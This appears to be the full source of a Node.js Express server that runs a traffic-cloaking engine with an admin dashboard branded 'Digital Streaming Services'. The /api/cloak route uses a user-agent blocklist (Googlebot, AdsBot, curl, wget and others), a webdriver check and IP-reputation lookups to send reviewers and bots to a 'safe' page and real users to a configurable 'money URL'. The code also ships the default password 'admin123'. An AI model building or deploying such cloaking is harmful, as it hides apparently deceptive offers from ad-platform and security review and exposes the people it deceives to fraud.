const express = require('express');
const path = require('path');
const https = require('https');
const fs = require('fs');
const session = require('express-session');
const bcrypt = require('bcryptjs');

const app = express();
const PORT = process.env.PORT || 5000;

// ─── Data file paths ──────────────────────────────────────────────────────────
const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
const LOGS_FILE = path.join(__dirname, 'data', 'logs.json');
const MAX_LOG_ENTRIES = 500;

function readSettings() {
  try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
    return { moneyUrl: '', safeUrl: '/safe', enabled: true };
  }
}

function writeSettings(data) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2));
}

function readLogs() {
  try { return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLog(entry) {
  var logs = readLogs();
  logs.unshift(entry);
  if (logs.length > MAX_LOG_ENTRIES) logs = logs.slice(0, MAX_LOG_ENTRIES);
  fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
}

// ─── Admin password ───────────────────────────────────────────────────────────
// Set ADMIN_PASSWORD env var to your desired password. Default: admin123
var ADMIN_PASSWORD_PLAIN = process.env.ADMIN_PASSWORD || 'admin123';
var ADMIN_PASSWORD_HASH = bcrypt.hashSync(ADMIN_PASSWORD_PLAIN, 10);

// ─── Bot / crawler UA blocklist ───────────────────────────────────────────────
var BOT_PATTERNS = [
  /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /baiduspider/i, /yandexbot/i, /sogou/i, /exabot/i, /facebot/i,
  /ia_archiver/i, /mj12bot/i, /dotbot/i, /semrushbot/i, /ahrefsbot/i,
  /majestic/i, /rogerbot/i, /screaming.frog/i, /wget/i, /curl/i,
  /python-requests/i, /libwww-perl/i, /java\//i, /go-http-client/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
  /pinterest/i, /slackbot/i, /telegrambot/i, /headlesschrome/i,
  /phantomjs/i, /selenium/i, /webdriver/i, /scrapy/i,
  /crawler/i, /spider/i, /bot\b/i
];

function isBot(ua) {
  if (!ua) return true;
  return BOT_PATTERNS.some(function(p) { return p.test(ua); });
}

// ─── IP reputation check via ip-api.com ──────────────────────────────────────
function checkIP(ip) {
  return new Promise(function(resolve) {
    // Skip private/loopback IPs
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
        ip.startsWith('192.168.') || ip.startsWith('172.')) {
      return resolve({ proxy: false, hosting: false, country: 'XX', isp: 'local' });
    }
    var opts = {
      hostname: 'ip-api.com',
      path: '/json/' + ip + '?fields=status,country,countryCode,isp,org,proxy,hosting',
      method: 'GET',
      headers: { 'User-Agent': 'node-cloaker/1.0' }
    };
    var http = require('http');
    var req = http.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try {
          var parsed = JSON.parse(data);
          resolve({
            proxy: parsed.proxy || false,
            hosting: parsed.hosting || false,
            country: parsed.countryCode || 'XX',
            isp: parsed.isp || '',
            org: parsed.org || ''
          });
        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); }
      });
    });
    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); });
    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); });
    req.end();
  });
}

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 8 * 60 * 60 * 1000 }
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.adminAuth) return next();
  res.redirect('/admin/login');
}

// ─── Public routes ────────────────────────────────────────────────────────────
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// ─── Self-hosted cloaking engine ──────────────────────────────────────────────
app.post('/api/cloak', async function(req, res) {
  var settings = readSettings();
  var realIP = req.headers['x-forwarded-for']
    ? req.headers['x-forwarded-for'].split(',')[0].trim()
    : req.connection.remoteAddress;

  var ua = req.headers['user-agent'] || req.body.ua || '';
  var tz = req.body.tz || '';
  var sw = parseInt(req.body.sw) || 0;
  var sh = parseInt(req.body.sh) || 0;
  var wd = req.body.wd === true || req.body.wd === 'true';
  var pl = parseInt(req.body.pl) || 0;

  var moneyUrl = settings.moneyUrl || '/offer';
  var safeUrl = settings.safeUrl || '/safe';

  // If cloaking is disabled, always allow
  if (!settings.enabled) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP, country: 'XX',
      ua: ua.slice(0, 80), decision: 'allow', reason: 'disabled'
    };
    appendLog(entry);
    return res.json({ decision: 'allow', url: moneyUrl });
  }

  // Check UA for bots
  if (isBot(ua)) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP, country: 'XX',
      ua: ua.slice(0, 80), decision: 'block', reason: 'bot-ua'
    };
    appendLog(entry);
    return res.json({ decision: 'block', url: safeUrl });
  }

  // webdriver flag
  if (wd) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP, country: 'XX',
      ua: ua.slice(0, 80), decision: 'block', reason: 'webdriver'
    };
    appendLog(entry);
    return res.json({ decision: 'block', url: safeUrl });
  }

  // IP reputation check
  var ipData;
  try { ipData = await checkIP(realIP); } catch (e) {
    ipData = { proxy: false, hosting: false, country: 'XX', isp: '' };
  }

  var decision = 'allow';
  var reason = 'clean';

  if (ipData.proxy || ipData.hosting) {
    decision = 'block';
    reason = ipData.proxy ? 'proxy-vpn' : 'datacenter';
  }

  var entry = {
    ts: new Date().toISOString(),
    ip: realIP,
    country: ipData.country || 'XX',
    ua: ua.slice(0, 80),
    decision: decision,
    reason: reason
  };
  appendLog(entry);

  res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
});

// ─── Legacy proxy (kept for backward compat, now self-hosted) ─────────────────
app.post('/api/cloakify', function(req, res) {
  res.redirect(307, '/api/cloak');
});

// ─── Admin login ──────────────────────────────────────────────────────────────
app.get('/admin/login', function(req, res) {
  if (req.session && req.session.adminAuth) return res.redirect('/admin');
  var error = req.query.error ? '<p class="error">Invalid credentials. Try again.</p>' : '';
  res.send(adminLoginPage(error));
});

app.post('/admin/login', function(req, res) {
  var password = req.body.password || '';
  if (bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    req.session.adminAuth = true;
    return res.redirect('/admin');
  }
  res.redirect('/admin/login?error=1');
});

// ─── Admin logout ─────────────────────────────────────────────────────────────
app.get('/admin/logout', function(req, res) {
  req.session.destroy(function() { res.redirect('/admin/login'); });
});

// ─── Admin dashboard ──────────────────────────────────────────────────────────
app.get('/admin', requireAdmin, function(req, res) {
  var settings = readSettings();
  var logs = readLogs();

  var today = new Date().toISOString().slice(0, 10);
  var todayLogs = logs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
  var allowCount = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
  var blockCount = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;

  var recentLogs = logs.slice(0, 100);

  res.send(adminDashboardPage(settings, allowCount, blockCount, recentLogs));
});

// ─── Admin settings save ──────────────────────────────────────────────────────
app.post('/admin/settings', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.moneyUrl = (req.body.moneyUrl || '').trim();
  settings.safeUrl = (req.body.safeUrl || '/safe').trim();
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin toggle cloaking ────────────────────────────────────────────────────
app.post('/admin/toggle', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.enabled = !settings.enabled;
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Clean URLs ───────────────────────────────────────────────────────────────
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});

// ─── HTML templates ───────────────────────────────────────────────────────────
function adminLoginPage(errorHtml) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0010;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
.card{background:#1a0d2e;border:1px solid #3d1f6e;border-radius:12px;padding:40px 36px;width:100%;max-width:380px;box-shadow:0 8px 40px rgba(0,0,0,0.5)}
h1{font-size:1.4rem;margin-bottom:6px;color:#c084fc}
.sub{font-size:0.82rem;color:#888;margin-bottom:28px}
label{display:block;font-size:0.82rem;color:#aaa;margin-bottom:6px}
input[type=password]{width:100%;padding:11px 14px;background:#0d0010;border:1px solid #3d1f6e;border-radius:8px;color:#e0e0e0;font-size:0.95rem;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#a855f7}
button{width:100%;margin-top:20px;padding:12px;background:#7c3aed;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .2s}
button:hover{background:#6d28d9}
.error{color:#f87171;font-size:0.85rem;margin-top:14px;text-align:center}
</style>
</head>
<body>
<div class="card">
  <h1>Admin Panel</h1>
  <p class="sub">Digital Streaming Services &mdash; Cloaking Control</p>
  <form method="POST" action="/admin/login">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" autofocus autocomplete="current-password" placeholder="Enter admin password">
    <button type="submit">Sign In</button>
    ${errorHtml}
  </form>
</div>
</body>
</html>`;
}

function adminDashboardPage(settings, allowCount, blockCount, logs) {
  var toggleLabel = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
  var statusBadge = settings.enabled
    ? '<span class="badge on">ENABLED</span>'
    : '<span class="badge off">DISABLED</span>';

  var logRows = logs.map(function(l) {
    var cls = l.decision === 'allow' ? 'allow' : 'block';
    var ts = l.ts ? l.ts.replace('T', ' ').slice(0, 19) : '';
    return '<tr><td>' + ts + '</td><td>' + escHtml(l.ip || '') + '</td><td>' + escHtml(l.country || '') + '</td><td class="ua">' + escHtml((l.ua || '').slice(0, 60)) + '</td><td class="' + cls + '">' + escHtml(l.decision || '') + '</td><td>' + escHtml(l.reason || '') + '</td></tr>';
  }).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0010;color:#e0e0e0;min-height:100vh}
header{background:#1a0d2e;border-bottom:1px solid #3d1f6e;padding:16px 28px;display:flex;justify-content:space-between;align-items:center}
header h1{font-size:1.1rem;color:#c084fc;font-weight:700}
header a{color:#888;font-size:0.82rem;text-decoration:none}
header a:hover{color:#c084fc}
.container{max-width:1100px;margin:0 auto;padding:28px 20px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px}
@media(max-width:700px){.grid{grid-template-columns:1fr}}
.card{background:#1a0d2e;border:1px solid #3d1f6e;border-radius:12px;padding:24px}
.card h2{font-size:0.9rem;text-transform:uppercase;letter-spacing:1px;color:#a78bfa;margin-bottom:18px}
.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:0.78rem;font-weight:700;letter-spacing:0.5px}
.badge.on{background:#14532d;color:#4ade80}
.badge.off{background:#450a0a;color:#f87171}
.toggle-status{display:flex;align-items:center;gap:14px;margin-bottom:16px}
.toggle-status p{font-size:0.85rem;color:#888}
form.inline{display:inline}
button{padding:10px 20px;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;transition:background .2s}
.btn-primary{background:#7c3aed;color:#fff}
.btn-primary:hover{background:#6d28d9}
.btn-danger{background:#7f1d1d;color:#fca5a5}
.btn-danger:hover{background:#991b1b}
.btn-success{background:#14532d;color:#4ade80}
.btn-success:hover{background:#166534}
label{display:block;font-size:0.8rem;color:#aaa;margin-bottom:5px;margin-top:12px}
input[type=text],input[type=url]{width:100%;padding:9px 12px;background:#0d0010;border:1px solid #3d1f6e;border-radius:8px;color:#e0e0e0;font-size:0.88rem;outline:none}
input[type=text]:focus,input[type=url]:focus{border-color:#a855f7}
.stats{display:flex;gap:16px;flex-wrap:wrap}
.stat{flex:1;min-width:110px;background:#0d0010;border-radius:10px;padding:16px;text-align:center;border:1px solid #3d1f6e}
.stat .num{font-size:2rem;font-weight:700;display:block}
.stat .lbl{font-size:0.75rem;color:#888;margin-top:4px}
.allow-num{color:#4ade80}
.block-num{color:#f87171}
.log-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:0.8rem}
th{text-align:left;padding:8px 10px;color:#a78bfa;border-bottom:1px solid #3d1f6e;font-weight:600;white-space:nowrap}
td{padding:7px 10px;border-bottom:1px solid #1e1035;color:#ccc}
td.ua{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#888}
td.allow{color:#4ade80;font-weight:600}
td.block{color:#f87171;font-weight:600}
tr:hover td{background:rgba(124,58,237,0.06)}
.full-width{grid-column:1/-1}
</style>
</head>
<body>
<header>
  <h1>&#9680; Cloaking Admin</h1>
  <a href="/admin/logout">Sign out</a>
</header>
<div class="container">

  <div class="grid">

    <!-- Cloaking Toggle -->
    <div class="card">
      <h2>Cloaking Engine</h2>
      <div class="toggle-status">
        ${statusBadge}
        <p>Traffic filtering is ${settings.enabled ? 'active' : 'inactive'}</p>
      </div>
      <form method="POST" action="/admin/toggle" class="inline">
        <button type="submit" class="${settings.enabled ? 'btn-danger' : 'btn-success'}">${toggleLabel}</button>
      </form>
    </div>

    <!-- Stats bar -->
    <div class="card">
      <h2>Today's Stats</h2>
      <div class="stats">
        <div class="stat"><span class="num allow-num">${allowCount}</span><span class="lbl">Allowed</span></div>
        <div class="stat"><span class="num block-num">${blockCount}</span><span class="lbl">Blocked</span></div>
        <div class="stat"><span class="num" style="color:#a78bfa">${allowCount + blockCount}</span><span class="lbl">Total</span></div>
      </div>
    </div>

    <!-- URL Settings -->
    <div class="card full-width">
      <h2>URL Settings</h2>
      <form method="POST" action="/admin/settings">
        <label for="moneyUrl">Money URL (shown to real users)</label>
        <input type="text" id="moneyUrl" name="moneyUrl" value="${escHtml(settings.moneyUrl || '')}" placeholder="https://your-offer-url.com">
        <label for="safeUrl">Safe URL (shown to bots / reviewers)</label>
        <input type="text" id="safeUrl" name="safeUrl" value="${escHtml(settings.safeUrl || '/safe')}" placeholder="/safe">
        <button type="submit" class="btn-primary" style="margin-top:18px">Save URLs</button>
      </form>
    </div>

  </div>

  <!-- Decision Log -->
  <div class="card">
    <h2>Decision Log &mdash; Last ${Math.min(logs.length, 100)} entries</h2>
    <div class="log-wrap">
      <table>
        <thead>
          <tr><th>Timestamp</th><th>IP</th><th>Country</th><th>User Agent</th><th>Decision</th><th>Reason</th></tr>
        </thead>
        <tbody>
          ${logRows || '<tr><td colspan="6" style="text-align:center;color:#555;padding:20px">No entries yet</td></tr>'}
        </tbody>
      </table>
    </div>
  </div>

</div>
</body>
</html>`;
}

function escHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
